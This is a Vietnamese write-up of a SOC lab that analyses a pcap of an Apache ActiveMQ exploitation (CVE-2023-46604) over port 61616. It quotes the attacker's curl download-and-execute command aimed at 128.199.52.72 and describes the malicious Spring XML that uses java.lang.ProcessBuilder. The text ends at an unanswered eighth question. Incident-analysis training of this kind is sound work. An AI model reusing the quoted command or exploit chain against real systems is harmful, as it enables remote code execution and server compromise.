# OPenWire Lab
## 1. Bối cảnh 

Bài Lab mô phỏng một sự cố trong ca trực của chuyên viên SOC tier-2. Chuyên viên tier-1 chuyển lên một máy chủ public-facing vì máy chủ này liên tục thiết lập kết nối ra ngoài tới nhiều địa chỉ IP đáng ngờ. Theo quy trình ứng cứu sự cố tiêu chuẩn, máy chủ được cô lập khỏi mạng để ngăn chặn lateral movement và rò rỉ dữ liệu, đồng thời đội an ninh thu thập một bản pcap từ công cụ giám sát an ninh mạng (NSM).

Nhiệm vụ của mình là đóng vai chuyên viên SOC: phân tích file pcap để xác định các dấu hiệu hoạt động độc hại, gồm địa chỉ IP của kẻ tấn công, giao thức và cổng bị khai thác, các file hoặc payload được tải về máy chủ, cùng các IOCs phục vụ việc truy vết và ngăn chặn.

## 2. Điều tra 

### Q1: By identifying the C2 IP, we can block traffic to and from this IP, helping to contain the breach and prevent further data exfiltration or command execution. Can you provide the IP of the C2 server that communicated with our server?
- Mình mở file pcap bằng Wireshark và dùng Statistics → Conversations để xem các cặp địa chỉ IP trao đổi nhiều nhất.
- Ở đây mình phát hiện được máy chủ bị ảnh hưởng là `134.209.197.3`, liên lạc với ba địa chỉ bên ngoài, trong đó với `146.190.21.92` có lưu lượng lớn nhất (4.867 gói, 5 MB).

 <img width="1552" height="176" alt="image" src="https://github.com/user-attachments/assets/9a115852-3a2c-4bb0-8e67-42d1f288fb6a" />

- Mình dùng Follow TCP Stream (tcp.stream eq 0) và thấy lưu lượng OpenWire của Apache ActiveMQ 5.18.0 mang một class `ClassPathXmlApplicationContext` kèm URL `http://146.190.21.92:8000/invoice.xml`, tức server bị khiến tải file XML cấu hình từ địa chỉ này.

- <img width="1917" height="312" alt="image" src="https://github.com/user-attachments/assets/802d2d67-e2ed-4eae-8555-5093b75f4d63" />

- Mình kết luận địa chỉ IP C2 chính là `146.190.21.92`

## Q2: Initial entry points are critical to trace the attack vector back. What is the port number of the service the adversary exploited?
- Từ lưu lượng OpenWire của Apache ActiveMQ chứa payload `ClassPathXmlApplicationContext` ở câu 1, mình lọc bằng `frame contains "ClassPathXml"` để tìm gói khai thác.
- Trong gói này, mình phát hiện được cổng đích trên máy chủ bị ảnh hưởng `134.209.197.3` là `61616`

<img width="1127" height="636" alt="image" src="https://github.com/user-attachments/assets/10b001d1-760b-4d3f-b59d-978a162bc09b" />


## Q3: Following up on the previous question, what is the name of the service found to be vulnerable?

- Dựa vào kết quả mình đã khai thác đươc ở câu 1 cho thấy giao thức đang dùng là OpenWire và dịch vụ nhận kết nối là `Apache ActiveMQ` phiên bản 5.18.0.

## Q4: The attacker's infrastructure often involves multiple components. What is the IP of the second C2 server?

- Mình lọc `http.request.uri contains "invoice.xml"` và thấy máy chủ `134.209.197.3` gửi hai yêu cầu `GET /invoice.xml` tới `146.190.21.92:8000`. Mình dùng Follow HTTP Stream để đọc nội dung file XML trả về.

<img width="1917" height="230" alt="image" src="https://github.com/user-attachments/assets/0249918a-7182-46de-b582-7339c9dde696" />

- File XML là một cấu hình Spring tạo đối tượng `java.lang.ProcessBuilder` và chạy lệnh `bash -c "curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker"`, tức là tải file `docker` từ **128.199.52.72** về `/tmp`, cấp quyền thực thi rồi chạy

<img width="1326" height="771" alt="image" src="https://github.com/user-attachments/assets/cf49bac4-a2c0-436f-bff0-8b8ecc5ec1e3" />

**Đáp án:** `128.199.52.72`

## Q5: Attackers usually leave traces on the disk. What is the name of the reverse shell executable dropped on the server?

- Từ nội dung `invoice.xml` ở câu 4, lệnh được chạy trên máy chủ là `curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker`, tức máy chủ tải file **docker** về `/tmp`, cấp quyền thực thi rồi chạy.
- Mình cũng xem Follow TCP Stream của luồng tới `128.199.52.72` và thấy yêu cầu `GET /docker` (User-Agent `curl/7.68.0`), phản hồi `200 OK`.

<img width="1727" height="435" alt="image" src="https://github.com/user-attachments/assets/f55968fe-0f22-49fa-bf9b-9cf1b1a8a139" />

**Đáp án:** `docker`

## Q6: What Java class was invoked by the XML file to run the exploit?

- Mình dùng lại nội dung file `invoice.xml` đã đọc bằng Follow HTTP Stream ở câu 4, trong file có khai báo `<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">`, tức Spring tạo một đối tượng của class **java.lang.ProcessBuilder** rồi gọi phương thức `start` ngay sau khi tạo.

<img width="1326" height="771" alt="image" src="https://github.com/user-attachments/assets/cf49bac4-a2c0-436f-bff0-8b8ecc5ec1e3" />

**Đáp án:** `java.lang.ProcessBuilder`

## Q7: To better understand the specific security flaw exploited, can you identify the CVE identifier associated with this vulnerability?

- Từ các phát hiện trước, dịch vụ bị khai thác là Apache ActiveMQ 5.18.0, gói exploit gửi qua giao thức OpenWire chứa class `ClassPathXmlApplicationContext` kèm URL file XML trên máy chủ của kẻ tấn công. Mình tra cứu trên trang advisory của Apache và NVD thì thấy hành vi này tương ứng lỗ hổng `CVE-2023-46604`

## Q8: The vendor addressed the vulnerability by adding a validation step to ensure that only valid Throwable classes can be instantiated, preventing exploitation. In which Java class and method was this validation step added?

